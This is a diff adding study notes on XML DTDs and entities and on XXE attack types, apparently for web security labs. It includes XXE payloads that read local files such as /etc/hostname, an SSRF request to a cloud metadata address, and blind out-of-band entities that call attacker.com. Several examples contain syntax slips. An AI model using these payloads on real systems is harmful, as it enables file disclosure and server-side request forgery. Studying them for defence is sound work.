@@ -1,0 +1,81 @@
+DTD:
+it might represent a data, or another element (Child Element)
+  <DOCTYPE book []>
+  DTD elements:
+  <!ELEMENT name_of_element content>
+    <!ELEMENT bookTitle ANY>
+    <!ELEMENT bookTitle EMPTY> // no value
+    <!ELEMENT bookTitle (#PCDATA)> // string
+    <!ELEMENT bookTitle (author)> // child
+
+XML Entities (store information for later use)
+  internal
+    <copyright>All rights...</copyright>
+    <!ENTITY copyright "All rights...">
+      <copyright>&copyright;</copyright>
+  external
+    <!ENTITY bookTitle SYSTEM "URI">
+  parameter
+    <!ENTITY book_101(author, title, price, description)>
+    <!ENTITY book_201(author, title, price, description)>
+
+    <!ENTITY % common "author, title, price, description">
+      <!ENTITY book_101(%common;)>
+      <!ENTITY book_201(%common;)>
+
+
+    <!DOCTYPE book [
+      <!ENTITY % parameter_entity "<!ENTITY book_title 'This is the book title'>"> // declare anther entity
+      %parameter_entity; // call it
+    ]
+    <book>
+      <title>&bookTitle;</title> // use it
+    </book>
+Illegal Characters
+  <>"'&
+  < -> &#x3c;
+  > -> &#x3e;
+  " -> &#x22;
+  ' -> &#x27;
+  & -> &#x26;
+  // I can also use entity or numeric reference for example (not necessary hex)
+
+XXE Types:
+  In Band
+  Blind
+    Out of band OOB
+    Error Based
+
+<!DOCTYPE update [
+<!ENTITY xxe SYSTEM "file:///etc/password">
+]>
+
+In Band XXE
+<update>
+  <bio>&xxe;</bio>
+<update/>
+
+lab1:
+<DOCTYPE stockCheck [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+&xxe;
+
+ssrf:
+<DOCTYPE stockCheck [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/data">
+]>
+
+BLIND XXE | Out of Band XXE
+
+stockCheck [ <!ENTITY xxe SYSTEM "http://attacker.com" >]>
+&xxe;
+
+<!DOCTYPE data [
+<!ENTITY %xxe SYSTEM "https://attacker.com/">
+%xxe;
+]>
+
+<data>
+  <prodId>123</prodId>
+</data>
